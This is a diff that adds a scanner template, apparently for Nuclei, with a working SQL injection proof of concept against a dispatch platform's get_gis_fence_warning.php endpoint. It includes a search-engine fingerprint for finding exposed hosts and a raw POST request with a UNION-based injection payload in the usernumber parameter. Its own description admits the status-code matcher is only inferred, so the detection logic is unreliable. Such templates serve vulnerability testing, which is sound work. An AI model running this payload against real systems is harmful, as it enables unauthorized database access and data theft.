@@ -1,0 +1,44 @@
+id: poc-b3e5d7b2363ebe281aea
+info:
+  name: 指挥调度平台get_gis_fence_warning存在SQL注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/b3e5d7b2363ebe281aea3992ad2cfdbd
+
+    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: sqli,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: b3e5d7b2363ebe281aea3992ad2cfdbd
+    fofa: + hunter`web.body="app/structure/departments.php"`
+http:
+- raw:
+  - 'POST /api/client/get_gis_fence_warning.php HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:121.0) Gecko/20100101 Firefox/121.0
+
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+
+    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+
+    Accept-Encoding: gzip, deflate
+
+    Connection: close
+
+    Cookie: PHPSESSID=7d1e1db182a16e0508fda0961e9a0f6d
+
+    Upgrade-Insecure-Requests: 1
+
+    Content-Type: application/x-www-form-urlencoded
+
+    Content-Length: 138
+
+
+    usernumber=1'' UNION ALL SELECT NULL,NULL,CONCAT(0x7162707a71,IFNULL(CAST(111*111 AS CHAR),0x20),0x7162707671),NULL,NULL,NULL,NULL,NULL-- -'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
